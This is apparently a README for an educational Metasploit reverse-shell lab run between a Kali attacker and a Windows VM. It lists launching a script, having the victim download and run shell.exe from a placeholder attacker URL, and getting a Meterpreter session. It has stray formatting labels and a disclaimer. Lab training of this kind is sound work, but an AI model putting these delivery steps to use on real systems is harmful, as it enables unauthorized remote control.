# Metasploit Reverse Shell Lab

A step-by-step reverse shell lab using Metasploit Framework, designed for educational purposes only in a virtual test environment (Kali + Windows 10 VM).

## 📁 Folder Structure

metasploit-reverse-shell-lab/
├── scripts/ # run_lab.sh automation script
├── payloads/ # Generated shell.exe (ignored in Git)
├── screenshots/ # Images of the shell session
├── README.md
└── LICENSE

## ⚙️ How to Use

### 1. On Kali Linux (Attacker):

```bash
cd scripts
./run_lab.sh <KALI_IP> 4444
2. On Windows VM (Victim):
Open browser and go to:

arduino
http://<KALI_IP>:8000/shell.exe
Download and run the file to trigger a Meterpreter session.

✅ Expected Output
On Kali, you'll get:

nginx

meterpreter > sysinfo
⚠️ Disclaimer
This lab is for educational and ethical hacking in a controlled virtual environment only. Do not use this code against unauthorized systems.

---

